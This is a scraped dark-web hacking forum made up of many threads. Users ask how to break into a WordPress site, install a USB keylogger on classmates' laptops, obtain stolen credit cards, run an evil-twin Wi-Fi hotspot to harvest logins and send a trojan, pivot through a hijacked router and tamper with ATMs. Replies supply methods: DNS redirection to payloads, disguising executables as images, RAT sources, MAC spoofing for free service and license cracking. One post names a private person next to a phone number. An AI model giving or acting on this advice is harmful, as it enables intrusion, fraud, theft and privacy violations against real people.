So I wanted to get into this website and they use word press, the login page is located at /wp-login and looks something like this: IMAGE LINK: http://prntscr.com/c3zdmt I dont know if that helps or not but if you need anymore information please let me know. So I am happy to take suggestions on how to get into the actual website its self or even different methods of getting into the website. Please explain simply on how to do this because I am not that advanced hacker you see on here.Thank you,Jappa.
whats the site ? i can do a vulnerability scan if you want
a WpScan just identifies possible vulnerabilities not actual ones right?  Cause I have done scans and found a bunch of vulnerable plugins and tried to exploit it but no dice.  Any wisdom would be enlightening.
hi guys,soon everyone from my class will need a laptop. so i thought that would be a very good chance to get some private information from some of my mates. i have been thinking to transfer a keylogger with an usb-stick on the laptop of the victims (their OS is windows). the keylogger should also be able to send me the logs via email.besides, does anyone here have a better idea how to exectue my plan? where should i get the keylogger from? and is there any possibility to change the usb-stick that it automatically runs the keylogger when it's plugged into the victims device, in spite of antivirus softwares? (e.g. avira, norton..)
This thread is intended for people to discuss using these techniques in robotics. Which one works best for autonomous robots and our experience of using these techniques.

LAST UPDATE 4th November 2016:I wrote some scripts which help mirror IE to create a backup, mine data and help verify people and entertain them in the IRC. There are two mirrors:IEBackup.tar.gz: The gzipped tar compressed version of IE. sha1(IEBackup.tar.gz) = 9a8740a2fce4f0d7d044d43b2410bb7fb5e8353fhttp://www.fileconvoy.com/dfl.php?id=g73246298dab1614699989962242a0afe00da3312d[/ur]IEBackup.zip: The zip compressed version of IE. sha1(IEBackup.zip) = e805bbde9c5d5142586ac4f70fb316049fc60137http://www.fileconvoy.com/dfl.php?id=g84a8263c452c09499998996239cc42b16361056bf[/url]First things first: Extract the archive into a directory, and make sure you have python and the following python packages installed: bs4, flask, whoosh (+optionally easirc for the chat bot). Also make sure you have a tor proxy running on the standard host:port combiation (127.0.0.1:9050).For more info, I'll just dump the contents of the README.txt here:---------- ABOUT ----------This software was initially conceived as a mirroring software for the Intel Exchange,but now also works as a verification bot AND as chatbot.Due to ugly hacks, all scripts but IEChatBot.py are both python 2.7 and python 3 compatible.---------- REQUIREMENTS ----------This software REQUIRES the following python packages (can be installed with "pip install $packagename"):pysocksBeautifulSoup4whooshflaskrivescript---------- INSTALLING ON TAILS ----------apt-get update apt-get install python-setuptools #python3-setuptoolstorify easy_install piptorify pip install pysocks # repeat for other packages (see REQUIREMENTS)chmod -R oga+rx /usr/lib/python2.7/dist-packages #tails has too restrictive permissionsThis software OPTIONALLY uses the following python package:easyirc (if you want to run the chat bot, recursive requirements: distribute, prettyexc, cacheobj)---------- USAGE ----------To mirror IE, start IEParser.py (python IEParser.py or python3 IEParser.py)To start a web server mirror with which you can browse the threads, start IEServer.pyand visit 127.0.0.1:5000 with your web browserTo start the chatbot, run python IEChatBot.py This will start a chatbot on the agora IRCTo create and automatically upload a backup, run IEBackupGenerator.pyAnd to verify people, you need to start IEVerify.py, which will verify people, IF the accountshave been set up correctly--------- SETTING UP VERIFICATION ACCOUNTS TO VERIFY PEOPLE---------This software was sent to you without the credentials required to verify people, for obvioussecurity reasons. To set up a verification bot, you need to do the following:Either run "python credentialshelper.py" to easily create them, or create the credentials file manually.Create a file named "credentials.py" (without quotes) in the same directory as the other scripts.In the file, you will need to create 4 key-value pairs:The keys are BOTUSERNAME, BOTPASSWORD, MODUSERNAME and MODPASSWORDThe format is 'key="value"'.Example:----- BEGIN EXAMPLE -----BOTUSERNAME="bla"BOTPASSWORD="blub"MODUSERNAME="plip"MODPASSWORD="plop"----- END EXAMPLE -------------- BUGS ---------Feel free to report bugs to the3coder, who created this software.--------- COMPLAINS ----------Go to /dev/null
What version of python should we use or is any version fine.
Very cool, keep it up!Will test it out, and see what it does.;-)
Python nonstandard libraries required: PySocks, BeautifulSoup4, easyircThe problem is that this fucking easyirc library is written in 2.x and has not been converted, so atm you need python 2.A new version is now available here.As usual, extract the file ("tar xf IEDownloader.tar") andRun "python IEParser.py" to update the posts and "python IEServer.py" to have a server running on localhost:5000 on which you can view the different thread by visiting the url "http://127.0.0.1:5000/thread/<thread id>", while <thread id> is the id of the thread you want to see. At the moment there isn't a way to have the threads listed, I'm working on that.Edit 11.1.2014, 19:30 UTC:There was a bug, making IEBot crash when IE is down. I fixed it, re-uploaded everything and updated the link. Have fun!
ok thx
<outdated, for info about script see updated top post>
this is amazing the3coder!!! nice workBTW do I still need to use python version 2?
<outdated post, read about the scripts in the top post>

Reuploaded the tools, added a little more documentation + the up-to-date database.
Thanks for all that you do!
Thank you ! , that nickname suits you :)
Wow, I haven't been updating this thread in a looooong time.I probably added some stuff in the meantime: More chat functions for IEChatBot (a few text replies, single thread mirroring).Today, I also added instructions how to install the tools on tails and uploaded a fresh version. Feel free to play around with it :)
The link seems to be expired for the DL for the backup tool
Strange, the mirror should stay up for 28 days... Anyway, I reuploaded it.
I'm thinking of starting a coding service to generate some side income to my main job. I need some practice with some test clients to see how I can handle it so feel free to leave any ideas for things such as Malware and such. It will be coded in Python 3.5Thanks 
Good Luck. just a tip, If its for $$, than scammers/spammers should be your audience.
I thought about that. I know HTML and light java so I'm halfway there already. But feel free to leave suggestions of what you want me to attempt to make, I'll even post the script for you too :) 
You could have a look at IE Tools and suggest some improvements :)
Did you intend for that link to lead to some unverified users post? I assume that was an accident, but regardless I'm interested in having a look at IE Tools! Thanks for the information, I'll have a poke around
I must have accidentally deleted the last character of the link, it's fixed now.
Since there are so many questions about hacking, I thought I would make a thread about it... Here are some very good books about hacking, so don't come back and ask how to hack until you've read and understood those :)An important note: If you want to learn how to hack, you need to know how to program... How are you going to change the way a program works if you don't even know how a program works...

@the3coder, thanks for the info, i had another thread similar to this. i understand the connection to programming and hacking. Is there a specific order of programming languages to learn for the best results. P.S. I am totally looking at all of the links, Thanks again
@L0ki9i dont know about an order for learning programming lang.but i think Python would be good to start with, and then move to C# and C++when you have mastered that go learn Assembly, it's a mofo killer O.o//G0dR4pe

Amazing work!
I always sent people to cybrary.it (surface site). It's a good site that has plenty of guides in both advanced and basic stuff. 
BeeSting: That site is blocked by cloudflare :(Added 1 new site.
    Livejasmin.com is a adult webcam website, you pay for credits and with those credits you can go private, tip or sneak peak into a private room. They normally have a add running, you get 9.99credits if you register and purchase a certain amount of credits.     I recently started using a VPN and what i've noticed is that in certain countries you can also get an add that can give you 10 free private sneak peaks.So basically you click on that add, add a username, password and email and instantly gain 10 free sneak peaks ( normal sneak peaks cost 1 credit, 27 credits is like 30 euros if I remember correctly ).    What you can do with this is you can register, use that free bonus, *log out* ( its not really that easy as you will see ) and then register again and gain another 10 speak peak bonus.  As I said, it is not that easy, if it is your first time ever accessing the website and you are in a specific country ( like US ) you will get that add from them and you will be able to register and get the bonus. The problem comes when you try to do it again.   1.If you logout after registering and refresh the page to get the add in order to register again and gain the bonus it will not appear.    2.You can clear your browsing data ( cache and all that stuff ) enter the website again and you will probably get the bonus add but if you try to register it will either ask you to validate your email ( the problem with this is that you cannot repeat this unless you have a lot of emails ) or sometimes it will register but you will not receive the bonus.  3.I haven't tried this yet but you can also clear your browsing data and connect in with a different ip within US, this might work  and you will be able to login and receive the 10 sneak peak bonuses without the need of validating your email.Things to note: you cannot use the same email address, if you do you will be able to register but you will not get the bonuses.What I wanna know is, how does a website know you've been there before ? What does it keep track of to know its you and no someone else ? How can I get around it and get the perfect situation, registering without the need of validating via email address ? 
An interesting post,a bit of a lame subject though.
that's why I made it on the deep web 
Hello IE. To get onto the Internet, I spoof my mac address and sign into an hour complimentary Xfinity session. When the session runs out, I spoof my mac again and sign into another. I've been doing this for about a year and so far it's never failed me. I was wondering what the legal repercussions would be if I was caught exposing this little trick, and how likely and by which methods "they" can catch me. I always use 12345 and a@a.com as the zip/email credentials but don't usually bother with high levels of anonymity.
Goood to know I'm not the only one, You can make a script that dose all this every 2h automatically.
I presume you are doing this via those Xfinity wifi hotspots, and are you going around and doing this or are you at your home and jacking this from a neighbor?  You wouldn't be able to do this via modem, they have that shit locked down.  So, yeah, the only way they could do something is by shutting things off at the wifi, but they won't do that.  The only way they could investigate you is by sending someone out there and trying to locate you in the physical world.  They would have to send a tech with fox-hunting equipment and track which house/apartment/car/whatever you are in.  Then they'd have to file a law suit and maybe get some money from you, or not, and to do that, they have to know who you are.  I don't think they think its worth the trouble.  After all, you are one of the very few that goes through so much trouble to get free internet.
@Rick1029384756, It is through the Xfinity hotspots, and I use both neighbor's and random "around town" hotspots. Thanks for the reply
@mojo,Since my main OS is Linux Mint and a cloned mac address option is conveniently located in my network settings, I haven't found the need to write a script. Would you maybe let me take a look at yours for reference?
What is the best linux? What will it take to get the masses on board and the powerhouses in technology to contribute to the platform? I am still new to linux. I have and am using it but I notice that it is very not unified. So many distros and not much invested in them. As OS's they are great but the infighting and the corporate powerplays are hold the potential back. What are your thoughts and what do you suggest can reduce the learning curve for future adopters of this platform?
I decided for Debian GNU/Linux in 1997 if I remember well, and haven't changed my mind since.Of course, there is a learning curve, but it is well invested.Ubuntu would be my second choice: however it's a bit too closed to my taste, and too bloated for me.  The advantage is that if you learned the basics of Debian, you will be able to transfer your knowledge to Ubuntu, since it's a Debian-based system.
Best Linux? That's a bit vague since different linux distros are made for different purposes. So it generally depends on what you're intending on using linux for. TAILS for example, is configured for anonymity and would be best used for people such as journalist in an oppressive country or a person who doesn't want to be traced. Scientific linux are aimed at people who needs a OS with pre installed graphing software and calculating mechanism. But let's just say we go along with the question, the best linux would be LFS (Linux From Scratch). The best linux you can get is the one you build. I'd recommend going with Arch linux though as a beginner (yes I know it takes time to learn how to use it properly) but the only way for you to be good at linux is to use linux and understand it from ground up. The only way for you to finish any work is start the work and continue it the right way. Yes you will make a lot of errors and you have to learn from these or you will never get a proper understanding of linux. 
I have been using kali , Ubuntu , Debian , rails but i ended up with arch linux so much customization and with the blach arch repo you can install all kali tools websploit, sqlmap,metasploit etc very easy 
Slackware
I'm using a Linux Mint 17 workstation loaded on a Dell Vostro tower PC. Stable and solid combination that was easy to set up and configure. Great online support, and you don't have to spend a lot of time learning command line stuff right off the bat. My wife loves her Linux Mint notebook for her business trips. It is fully encrypted and easy for her to use, as she has always been a Windows person.As the others say, try lots of different distros, you'll find the one you like. If you don't have several computers to play around with, hit business auctions and garage sales for late Vista era and Win7 era platforms. They're dumped for next to nothing usually.Good luck and have fun.
I've tried a lot too,Ubuntu, Debian, Kali, rails, Mint and last Arch, and im so satisfied by the community and all the help and the simplicity of the distro
Kali linux if your in it for tools, Mint for a replacement for Windows. Remember to install Wine so you can run some .exe's
Tails for anonymity, Kali Linux for network testing, SteamOS for gaming, Ubuntu like replacement for windows.Just try all and pick up one.
I use Linux Mint 18 nowadays. Debian is a pretty good choice as well if you don't mind the gnome interface.

Alright I am gonna throw an opinion out.. If you are doing any kind of hacking/cracking don't ever use Kali, you run as root by default(Yes I know that can be changed) and you are just asking to get yourself in a world of hurt. Yes Kali is the noOb hacker/cracking OS that everyone seems to love but I would honestly never trust it. Go with something like Parrot and or Backbox(If you want tools and to stay anon), Arch if you want custom, Tails if you just want to stay anon and Ubuntu if you just want to drop Windows.
I have to admit that I am biased as hell towards Linux Ubuntu.  Knum Knutz
I loaded up one of my boxes with Linux Mint 18 like you did 'thatguynick' and was pleased with the results. Can't understand why the people at Mint HQ won't put a Tor Browser package in their software manager library. Still have to load Tor the old fashion way. Mint works well with Steam and their Linux games. Ignotus is right, though, that Tails is best for anonymous browsing. Have been advocating Tails with several other users over on The Dark Lair for the members that live in 2nd and 3rd world countries that are using windows with Tor. Much safer for them.Have been hearing a bit about Parrot, ZackFa!con. Plan to download the ISO (it's huge!) and give it a try sometime.Loaded Manjaro recently on a recommendation from a YT vid. Didn't like it...
To start learning GNU/Linux use Debian with this course https://linuxjourney.com/. When ur progessed anough. You can hope between Arch or Gentoo Linux. And build your own system with your needs. Question? anonymous-user@sigaint.orgRegardsAnonymous
@Knum KnutzThe GNU/Linux UBuntu OS has been too much gone in to the Commerial use. And thet already started to invade our privacy. Check the Amazone Scandel frrom Ubuntu on any search engineSo Ubuntu is really a no go!RegardsAnonymous
I agree Ubuntu is a commercialised piece of bloatware now, no better than Windows in any respect. Different versions of Linux have different strengths so I've never settled for one. I use Manjaro, Slacko Puppy, Tails, Kali and Tinycore. Other than that I use a customised version of Windows XP x64 and RescaTux. I'm impressed with them all but not entirely for the same reasons. If you want to get the most out of your PC something like Puppy is extremely handy.
Ubuntu is fine if you are just starting to learn Linux. However I would quickly move away from it once you get your feet wet, there was a time when Ubuntu OS could be trusted, now that they are in bed with Amazon, Ubuntu is not as safe as it once was. For basic everyday use Ubuntu is fine but if you plan on doing anything above that, change to something that is built around security and designed for what you plan to use it for. Ubuntu is meant for people wanting to move from Windows slowly and get adjusted with a friendly Windows/Mac like OS. Don't get me wrong Ubuntu is a great OS, it does exactly what is expected of it and there is lots of online support if you need it. However if you are going to be doing things in the gray or black areas, Ubuntu should not be your first choice. Pick an OS that is designed for the use you have in mind. If you are worried about your games from Windows working on Linux, Ubuntu is a great choice. If you are defacing websites Ubuntu likely not a very good choice.Everything is a tool, don't try and use a nail file when you need a saw or glue when you need a weld. 
I'm looking for credit card information, or even just a few "phoney" credit cards someone might be able to share with me.The reason is a 'Robin Hood' sort of thing, so it's for a very good cause, but I'm just lacking the money to do so.I have very unique skill of "pyro-techniques" (if you catch that and need said info) I'm willing to trade that tidbit if someone is willing to part that info. I know CC information from someone else is a bit malicious, but what I have planned for it and not having what I need,to me is far more worse. To just say the least, it's for autism charities, which my son has, and I just don't have what I need for his school, and donations are really hard to come by in my neck of the woods. I'm not here for handouts nor am I here for pity. I'm tired of my son being treated different from the other students and I would really like to make his school look silly. But I need some currency to help. Any info would suffice. PLEASE AND THANK YOU VERY MUCH.        AND HAPPY EASTER TO ALL ON I.E.
PM me. I'll give you the link.

I'm trying to create a new fake facebook account, but i'm not getting past the verify by SMS section. Anyone got any tips on how to get past it? I've tried several free sms receivers, but all the numbers have been used.
Use/make a fake email-adress to verify.
Done that, still require a mobile number.
enter your birthdate less than 15 years.it will assume that u dont have a phone
Use a sms receiver online, that worked for me. The website I use is http://www.receive-sms-online.info/ so I know that works but there are plenty others.
I'll have to try the birthdate thing as invisiblegriffin mentioned, I did the sms receiver and they are all perpetually used.  I spent like 2 hours going through the different available numbers from all around the world, and the error comes back saying that number was recently used to verify another user.  I was even thinking about getting a burner phone, but that's no bueno either, because it will require an ID.  Which is where the younger than 15 thing kicks in...
Just tried as a 14 year old, still required a phone number, when I went to bypass saying I don't have one, they asked for a gov id... Facebook are nazis man! 
@Rick1029384756 lol looks like someone is having bad luck with this.
I used to get a kick out of doing this. I never used it for any malice, just for fun. And some malice. Some.
You don't need a burner phone, just buy a new pre-paid SIM, put it in a old or your current phone... That's what I did, it coast me +/- 0.90Eur per account, plus for g-mail accounts. 
Most people would set the Bios to boot to a disk and reset the Administrator password to access a computer but I wanted to know if anyone would have a technique to use if the entire Hard Drive was encrypted?
Often, disk encryption software store the real key used to encrypt the data in a metadata block on the disk, encrypted with a user-specified (weak) password. This allows people to change their password without re-encrypting all the data, but it's one of the weaknesses of those disk-encryption schemes. Usually, there are some known metadata on the disk (e.g. filesystem structure), that may be used as a cleartext entry point.
thanks adm1-42 the most annoying part of my job is to deal with peoples computer day in and day out.
It sounds like a severe pain and I hope you overcome it. One of the pains of drive encryption. I was thinking though if you can somehow recover it, it means the encryption is awful.

Very true, Full disk encryption is designed to prevent access in case the laptop or device is lost or stolen but it often slows down work as it can completely lock out a  user from his own work.
I got a raspberry B+, I have played around with few things but I'm wondering can I create it as a Wifi signal for sniffing acc information? Cuz I gotta McDonalds near me with a free wifi if I could DDoS it and set a Raspberry in my bag while I gather info it would be great! Or if anyone has any other cool "weekend" project ideas.
I feel like I didn't quiet explain whats my goal, I want to take my Raspberry B+(connected to a power bank) to a places where people check bank/email and other acc to give them free wifi but when you try to use it you need to log in or something, and at that moment somehow either by giving access to wifi signal with a confirmed email is -1h but with a unconfirmed 15mins... Which would make people do it(not all but some), while they "surf" the net see there preferences and after a week or two send an email with a trojan attached which would give me access... If anyone can help me I would greatly appreciate. Please reply to this post or email at: dexx@sigaint.orgSincerly, DeXx. 
just use a wifi pinapple
I feel that it is necessary to explain to you about how packet communication works. You can pickup anything wireless that travels through the air if you are on the right frequency. you can examine any packet that is not encrypted. Encryption will be used with any decent online service such as logins or banking (Most passwords will use hashing to reduce the surface area for theft).to be honest an 'Evil twin' combined with GhostPhisher or Wifisher ETC might be your best bet. 
I would love to learn more about it, so if you have any free time hit me up at  dexx@sigaint.org, And also if you would be interested in the progress.
Hello, again I'm here asking questions, so recently I got the Nexus 5X, after rooting it I couldn't find any tutorials or instructions about installing Kali NetHunter.If anyone has experience or instructions of how to install it, it would be greatly appreciated.Sincerely, DeXx!

I am wanting to learn how to hack, so would it be alright if i join? Get experience from others sort of thing?
Intermediate programmer over here. My email isn't sending to you just wanted to let you know. I guess contact me back in the comments if you are interested?
I have a very interestining proposal.
@Kishi what's your proposal ?
Same for me @Logo. Email didnt work. Lemme know if still thinking of getting it going.
Hi, if you are still interested in join a group please emailitsonlyreality@sigaint.org for more details and tell them Logo sent you.-- ThanksLogo
"Group of hackers", that's pretty generic.What's the goal?
Im a grey hat in a government program...Can you give us some details about the goal? 
What is the goal?
i would like to join and learn along the way
Glad I'm not the only noob here :-)
You are not the only noob! xD
I am not a professional but I feel like I could bring a lot to a likeminded group. I am deeply interested in anonymity, cryptography, steganography, encryption, coding and writing fiction. I love Linux but I'm planning to make my own operating system at some point. Much in the same way Terry Davis made TempleOS. Single handedly.
Hey I know its possible and it is done allot but I just cant figure out how it is done the clearnet doesn't have much info about it. How would one hide a fiel (for example a .exe)  in a .png and get it to be executed. I am capable of writing text to a .png via this short .bat file a wrote (using windows) :@echo offset/p loc= File location:set/p txt= Text:echo %txt% >>%loc%echo DoneBut I cant seem to figure out how to write any other files to a .png without breaking it.Thanks -EDIT24
Dude, that's so stupid, all you're doing is adding the text at the end of the file, after the file's bytes, if a guy just opens the file in notepad and scrolls to the end he can see your text, don't ever do that lol. If you want to send private text then use morse code within a .mp3 file or something similar that you and your partner can only get or understand (if for some reason you don't like relying on encryption) but not this...As for hiding a .exe in a .png then there's no clear method for that because it simply doesn't exist, people tend to do ridiculous things like changing the icon and renaming the file to change the extension and make it look like a picture for example, or use binders to bind the image and the file together which is also not enough because the formed file will simply "drop" the files in some hidden folder and then execute them, there's even another technique related to changing the "target" of an executable but all this is a joke lol. These techniques could work on people that have no idea what they're doing, if you're still interested then google about icon/extensions/assembly changers, binders, etc...The first thing you should try to get a file on someone else's system is to do it without their interaction, but if it's required then do it properly without using any of this 90s' bullshit lol.
you would have to write exif malicious data to a existing png file, and it will be a legit png.if you are writing a scrip and save as txt or compile it to .exe than you can't change to png.because the file-type is changed.you could do what i did. [yourfile.png (a lot f fucking spaces)              .exe]this will fool the most noob of users.but i can find better ways to do this..//G0dR4pe
@dotcppfile well it wasn't meant for hiding secret messages I was just playing around trying to hied stuff in a .png... that actually is a good idea if I already had access to the computer the whole point is to send a picture and it to be on the victims computer without the victim knowing about the other file.@G0dR4pe I didn't have much time to study the exif malicious data method but the few minutes I spent researching it it looked just like what I was looking for ��_ Thank you
One can use the alternate data streams feature of NTFS filesystem to hide files in other file.This can be threat on older versions of windows, such as windows xp.here is how it works and how to create alternate streamshttp://windowsitpro.com/systems-management/ntfs-alternate-data-streams
I honestly don't think there is a way to add a executable to a .png file or some other image file type. Now if your just wanting to hide something within a picture like a txt file (steganography), there are lots of tools that can do this for you. In fact I came across an article about it on Anon HQ. http://anonhq.com/steganography-hiding-text-messages-inside-image-files/However the link they provide is for software that you have to buy for the full version, but you can try it for free. As for the limitations of the free software I don't know. Steganography is still new ground for me. However for me personally I would think it would be better to learn how steganography works and make your own tool. I am sure someone has some source code for their own program online somewhere. I'll look around and let you know if I find anything of value for you. 
It's not as much about the picture as it is about the application that opens the picture.  You'll ultimately be using the png as a script file to tell the picture viewing application what to do.  The first question is to determine which application they use, and then start figuring out what that application looks for and how it handles the data from it.  Are there vulnerabilities with it linking to data from the web? Location data for example? Can it run or open another program?  Find out these answers and then you can start creating your virus or whatever. 
I've hidden images inside PNG both in the sense of hiding the image files in an image file and also in the sense that I've virtually hidden an image in an image in plain sight using steganography. I'm not an expert and it takes a long time but I consider it an art form. I love cryptography.
This is just to share what I have noticed and experienced.-Over 10+ Windows 7 Ultimate (legit key, activated via phone) then upgraded to Windows 10 Pro....   ****My Windows 7 Ultimate key is now deactivated... I need to call/email Microsoft and bitch...-eBay $30-40 dollar key (some work once and others I have used multiple times and activated via phone)   -I have had the cheap keys work more times than the more expensive ones for whatever reason...-KMS Auto Activate   -Has activated Office 2016 perfectly (came with the Office Torrent)     -Tried this as a Windows 10 Pro activation and it has been successful and still activated 14+ days (Still receiving Windows updated and all seems good)This is more or less just a "hey this worked for me" thread...If you have more to add to this please share.  
My question is why the hell would you want Windows 10 anyway? We all know its dirty CIA spyware.
Any good sources for learning cryptology?
I have no idea. I'd like to find out too, I'll comment again if I find anything.-AG
Cybrary.it has some I think
From unverified sectionhttp://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=15218Thought I'd share some of my plans for encypting the LTBTBM framework, and what I've found so far. RSA - asymmetric encryption - Point: Solves the problem of transferring encrpytion keys. How: Public and private key - one key encrpyts, one key decrypts. How is it broken: attacks in the implimentation, e.g. heartblead, where web ssl servers can be asked to hand over the keys they are using (or in fact anything in the server memory). attacks on the key: There is a mathematical relationship between the public key and private key. Since you give out the public key, someone "could" calculate your private key. However, since the precise mathematical relationship is not known how to calculate independantly from the size of the key, bigger and bigger keys take longer and longer to calculate. How long? Well, a 256 bit key takes a fraction of a second,a 512bit key takes about ten minutes on hardware your average consumer has. both take a fraction of a second on dedicated distributed hardware. anything less than an 8000bit key should be considered wholey insecure. Attacks on the math: implementations of big number calculators influenced to be much slower than they need to be, so calculations seem to take longer than they should. Attacks on the random number generators - so they only generate a few keys: http://www.loyalty.org/~schoen/rsa/ Symmetric encryption: Asymmtric encryption is also slow to encrypt/decrypt, so the solution is to use it to encrpyt the actual key used to encrypt a messsage, using a function that is "fast" to go from unecrypted message to encrypted message and vice versa. How is it Broken: getting the key (see above!!) statistical attacks (calculating the probability of certain keys or ranges of keys, I suppose attacking the random number generator to limit the number of keys produced also fits into this category) Poor implimentations e.g. http://www.bleepingcomputer.com/forums/t/547708/torrentlocker-ransomware-cracked-and-decrypter-has-been-made/ What's best - chaining more than one. My preference to date is first using the rabbit cypher, then AES on top of that. Signatures: These stem from the days when public keys were used to verify the integrity of the message. imho this is a stupid idea. much better to imply verify integrity by having the integrity checks encrypted inside the message. The desire here is to verify the source of the message. KEEP ALL KEYS "SAFE" !!! I was planning on building an integrated proxy to allow such messages via forums.. Much better now seems to be a way to create a way to make encrypted attachments for forums/email/any digital delivery mechanism. This will take two forms: public messages: Anyone can read/open the attachment, as long as they have been given the authors public key private messages: only the intended recipients can read the message. The way to acheive this, seems to be to have the output format a lossless png image, with the content being the encrypted message.RE:attacks on the keyPrime factorisation is "mostly" a solved problem.See:https://en.wikipedia.org/wiki/General_number_field_sieveTheres off the shelf code for doing 512 and 1024 bit on generally available hardware knocking around on the web. More than that and you need to go either to distributed implementations which I haven't seen in the public web, or custom hardware (such as high bit computers rather than the 64bit stuff you can get off the shelf.)The alternative to RSA is Diffie Hellman Key Exchange, this appears to be a stronger mechanism, if you assume the supposed NSA leaks saying they broke it are actually disinformation intended to put people onto RSA - with the side note that it does appear that the standard keys in ECDH are backdoored.As for "break all encryption".No it doesn't. low visibility keys and chained algorithms (such as the AES+Rabbit suggested above) would not be broken by an ability to factor large primes.The method chosen for the LTBTBM framework is long term private keys stored on each node (built but not verified to FIPS-140-2 level 4).a large random number shared between nodes each session which is used in combination with the long term private key to establish session keys (both username and random number are shared with RSA, but breaking this reveals nothing more than the username, which in most cases is equivelent to the IP/onion address, so doesn't reveal anything about the comms)commands and content are delivered using different keys.___If you are just starting, on what is a highly technical, and very very math heavy topic. I'd recommend watching:https://www.youtube.com/watch?v=8oD6eBkjF9oalso,http://quipqiup.com/index.phpis v. cool.
This is extremely relevant to my interests
After hacking a remote router (no wifi access, just public IP) what would be the best way to get into the rest of the network? I can login via the router's web config page, but the client list does not show IPs or anything. 
well first I would recomend you learn how a router works. A router was made to do the job of multiple devices. Including acting as a firewall. However if you can login to the router from the web page then I am not seeing what you are having difficulty doing. If you can put in the ip to the router in the url and login and essentially (join their netowork) I would think something like netdiscover would find anything you are looking for. Or try an nmap scan using the ip of the network 0.0.0.0/24 I mean there are lots of ways but your not providing enough information that one could tell you what you need to do just an idea whether it would work idk.
Sorry for the late reply, but thanks for yours. I can log into the web config page but I cannot find a way to join my PC to the wireless network. That is where I am confused. Since I can log into the router; how do I go about joining the wireless network? I have tried using aircrack-ng to get the has and use cudahashcat to crack it, but it runs for days without any success. 
Question, is the router putting out a wifi signal just without internet access? If so then just join like any other wifi signal. However if the shared key is different then the one to log into the config page then you may have to crack the key or you can try something like reaver for WPS (If it is enabled that is) Could you give me a little more info?
I think you are either in the modem, or the DMZ.  Depending on their settings you may be able to access them through another port.  I suggest a port scan, and see what comes back.
It's a router I found via shodan-hq. Different part of the country. I put the IP in the browser and login, but I can't find a way to access the other machines on the network. I've looked at the port forwarding, but there are no configs. 
change its DNS to a fake DNS you can make, than redirect the users to a malicious site you own or to some browser exploit or even make them download a payload or Trajan 
https://github.com/Dator-Coding/Peep-.gitMade this for a test client. Checks an IP to see if it is open for SSH or Telnet connectionhttp://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=15506 - for other requests 
Or any other RAT tool for that matter. I'd be interested in putting it on a few test VM's of mine and possibly a small network of computers. I won't make out like I'm going to use it for good intentions or anything but I'm certainly interested in seeing the software itself 
i might be wrong but sub7 is outdated and i think its been pretty much been taken off the internet so to speak and obviously nothing could ever disappear from the internet but i can assure you its very very very hard to find
Yeah, it got updated in 2004 and just wanted it for reference and analysis as I doubt it'd evade any security sweeps. nothing really from the surface web disappears but stuff like sub7 on the darknet would be on and off
I found a copy of sub7 in a torrent a few months back on pirate bay, I have no clue if it is still there or not, however if you are looking that is the best information I can provide you with.It had the client and server with it. However it is a script kiddie virus so pretty much all AV's will block and delete it pretty easy. I am not a 100% but I believe even Windows Defender blocks the server from ever running and might even remove it by default.DarkComet I am not sure about.--ZackFa!con
why don't you learn how use MSF, or even learn how to use a console or write codes. Rats are too old.
Yeah. I've started to develop my own malware and such. easier to avoid detection
I've seen both sub7 and DarkComet on a the clearnet site 404-sec.com/forums. Site's had issues so I don't know if they are still available. 
 I used VyprVPN before and its really good but you are only allowed 500MB, is there a free good one or where can I get a crack for VyprVPN ?
I doubt anyones got cracks for stuff like that. If your paranoid, just use Tails operating system 
Good VPN program? I will change the question and give answers on that.I want a VPN so i can game on school?CyberghostOr make one by your self.I wan't to use a VPN program to make my self more Anonymous.They're none. They have all backdoors. Keeps a bit of Logging for when they have the 3 letters agencies on there neck.
Greetings everyone I have decided to make this topic as a general Q and A discussion about hacking and possibly form a group if this gains enough attention.
good idea.
I have a few questions pertaining to accessing the setup menus on certain mini ATM's.  Since trying to find one with default passwords is nearly impossible, my question is by clearing the VRam during reboot this should reset the passwords but will I have to setup the entire operations besides setting the denominations?  Or will I get lucky and have the password resetted only?  Your thoughts please
By clearing the VRam on reboot you will reset it to factory defaults ,so in short you will most likely will have to run throgh the entire setup again.
Crappers, I thought so. It shouldn't take that long to setup, but a little worried on the network setup which should autoconfig.  Now it's all about finding that discreet atm to give me time to do all this.  Thanks for your input Reaper.
No problem thats why im here.
It'd be worth trying to explain what scenario that you are in. have you stolen one or plan to break into someones ATM and leave it there? 
It'd be worth trying to explain what scenario that you are in. have you stolen one or plan to break into someones ATM and leave it there? 
is it gone for good or is there a new link to it?
This used to be the URL http://4iahqcjrtmxwofr6.onion/, but it seems its down cant find any other link, there might be a mirror somewhere on here.
There have been constant raiding by American Law enforcement on TOR hosting sites across the Dark Web. Nearly the whole network is being monitored and is being challenged for effectiveness.
Cthulhu made a mirror if you want to go to that.
First person to trace this cell phone number based in Ontario, Canada, will get paid by me. The man who owns this cellular phone is named VUARNET BISHOP, and he's kidnapped a young girl by the name of Christine Lupton. It's all over the news in Canada. The cellular number for Vuarnet Bishop is 2897767811. Triangulation, pinging, etc. whatever needs to be done, let's do it. 
What's the news on this situation?Regards,Knum Knutz
A question here,Did this number was issued by police and news or only you have this info?
So ages ago in the 1900's you could spoof your phone number to gain free calls and stuff like that. I know it is still possible by changing your MEID or some shit but I was wondering how I would go about on doing so. Someone suggested that I should JTAG my android phone and in the process change my MEID however I want a better solution to that so if you have any idea how to clone a phone number to your phone number please let me know.Regards,Jappa.
Like I said, i'm searching for someone who would like to help build a really complete AI, but I would like to explain myself better in mails, contact me at : uncle_d0t@sigaint.org / uncle_d0t@sigaintevyh2rzvw.onion
what kind of an AI and for what?
I would actually like to build an AI who would be capable of worldunderstanding (with a machine learning algorithm I think), and who wouldhave a consciousness (I would really like to make researches in thatdomain, and actually, the whole project is on this) and maybe after add itsome features like communication with natural language and OpticalRecognition (for natural language I have some experience, but I want thisproject help me discover new subdomains in AI).
My best advice is to learn from a baby, and try to do the same in a machine, Its HARD, even SUPER HARD, BUT IF you get something working, companies will pay you billions for it.
I already started to do that. I've learned lots of things but I think it's the consciousness that's gonna be tha hard part. For the rest I think it's gonna be OK.
